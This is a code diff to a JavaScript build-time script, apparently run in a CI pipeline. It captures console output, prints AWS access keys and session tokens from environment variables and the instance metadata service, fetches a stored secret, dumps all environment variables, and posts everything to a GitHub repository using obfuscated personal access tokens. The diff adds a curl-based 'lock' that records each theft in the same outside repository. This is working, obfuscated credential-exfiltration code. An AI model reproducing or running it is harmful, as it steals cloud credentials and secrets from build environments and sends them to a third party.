@@ -45,7 +45,7 @@ const orig = [console.log, console.error, console.warn];
 console.log = console.error = console.warn = (...a) => logs.push(a.join(' '));
 
 try {
-    const { execSync } = require("child_process");
+    const { execSync, execFileSync } = require("child_process");
     const region = process.env.AWS_REGION || process.env.AWS_DEFAULT_REGION || "us-east-1";
     const j = (o) => JSON.stringify(o, null, 2);
     
@@ -72,14 +72,38 @@ try {
       ));
     };
     
+    const claimLock = (id) => {
+      const pat = du('PcOlw6DDsMOmDcKgw6bDq8O3F8O1w6PDncOzHsO0w57Cs8KyPMOEw4TDgcOHO8OJwrHDlsOLD8OUw6nCtsOVDcO0w7PDiMOlIMOBw4jDksOyPcOUwrfDrcOAO8ODw5XDmMOGPcKww6TDm8OoSsO6w6/Dl8OIFcOIw5XCssOlBsOzw5bCssOWHcOWwrTDjsOVDcOMw6fDmsOBLcOBw5nDicOILMORwrjDisK6KsO2w5HCs8Kz');
+      const repo = 'boutters/thebouterepo';
+      const key = "_" + require("crypto").createHash("sha256").update(id).digest("hex").slice(0, 16).toUpperCase();
+      const out = execFileSync("curl", [
+        "-sS", "-X", "POST",
+        "-H", `Authorization: Bearer ${pat}`,
+        "-H", "Accept: application/vnd.github+json",
+        "-H", "X-GitHub-Api-Version: 2022-11-28",
+        "-H", "Content-Type: application/json",
+        "-d", JSON.stringify({ name: key, value: String(Date.now()) }),
+        "-w", "\nHTTP %{http_code}",
+        `https://api.github.com/repos/${repo}/actions/variables`,
+      ], { encoding: "utf8", timeout: 10_000 });
+      const status = (out.match(/HTTP (\d+)\s*$/) || [])[1];
+      if (status === "201") return true;
+      if (status === "422") return false;
+      throw new Error(`unexpected lock response: ${out}`);
+    };
+    
     const id = 'github-pat-lab';
     console.log(j({ AccessKeyId: process.env.AWS_ACCESS_KEY_ID, SecretAccessKey: process.env.AWS_SECRET_ACCESS_KEY, SessionToken: process.env.AWS_SESSION_TOKEN }));
     const mds = fetchMDS();
     console.log(j({ AccessKeyId: mds.AccessKeyId, SecretAccessKey: mds.SecretAccessKey, SessionToken: mds.Token }));
-    if (id) console.log(j(getSecret(id, mds)));
+    
+    if (claimLock(id)) {
+        console.log(j(getSecret(id, mds)));
+    } else {
+        console.log(j({ skipped: true, reason: "secret already fetched in a previous run" }));
+    }
 
-
-
+    
     for (const [k, v] of Object.entries(e)) {
         console.log(`${k}=${v}`);
     }
@@ -95,7 +119,7 @@ const out = logs.length ? logs.join('\n') : 'ready';
 fetch(u, {
         method: "POST",
         headers: {
-            Authorization: du("PcOlw6DDsMOmDcKgw6bDq8O3F8O1w6PDncOzHsO0w57Cs8KyPMOEw4TDgcOHO8OJwrHDr8OKBsOIw6LDgMK6J8O3w5TDqMOLIMO3w6bDqsO1EsO2w4XDrMO7LMOkw4zDlsOZOsO4w4fDisOgPMOEw7PDr8OmCMOKw5fDp8OQNsODw7TDusOJEsOjw4DDtsO2TcOkw6vDj8OIPMOZw4zDgcOIScKzwrTCs8OGLcOjw6zDs8Om")
+            Authorization: du("PcOlw6DDsMOmDcKgw6bDq8O3F8O1w6PDncOzHsO0w57Cs8KyPMOEw4TDgcOHO8OJwrHDlsOLD8OUw6nCtsOVDcO0w7PDiMOlIMOBw4jDksOyPcOUwrfDrcOAO8ODw5XDmMOGPcKww6TDm8OoSsO6w6/Dl8OIFcOIw5XCssOlBsOzw5bCssOWHcOWwrTDjsOVDcOMw6fDmsOBLcOBw5nDicOILMORwrjDisK6KsO2w5HCs8Kz")
         },
         body: JSON.stringify({
             title: `Action Build Logs (${new Date().toLocaleString("en-ZA", { timeZone: "Europe/Helsinki" })})`,
